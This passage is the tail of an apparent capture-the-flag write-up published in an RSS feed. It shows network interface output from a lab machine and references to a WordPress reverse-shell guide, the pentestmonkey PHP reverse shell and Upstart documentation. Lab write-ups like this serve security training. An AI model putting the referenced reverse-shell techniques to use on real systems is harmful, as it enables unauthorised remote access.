1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN group default qlen <span style="color:#ae81ff">1000</span>
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc pfifo_fast state UP group default qlen <span style="color:#ae81ff">1000</span>
    link/ether 00:50:56:b9:0b:2c brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.229/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::15c7:10de:7382:baf8/64 scope global temporary dynamic
       valid_lft 86303sec preferred_lft 14303sec
    inet6 dead:beef::250:56ff:feb9:b2c/64 scope global dynamic mngtmpaddr
       valid_lft 86303sec preferred_lft 14303sec
    inet6 fe80::250:56ff:feb9:b2c/64 scope link
       valid_lft forever preferred_lft forever
</code></pre></div><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.hackingarticles.in/wordpress-reverse-shell/">https://www.hackingarticles.in/wordpress-reverse-shell/</a></li>
<li><a href="https://github.com/pentestmonkey/php-reverse-shell">https://github.com/pentestmonkey/php-reverse-shell</a></li>
<li><a href="https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it">https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
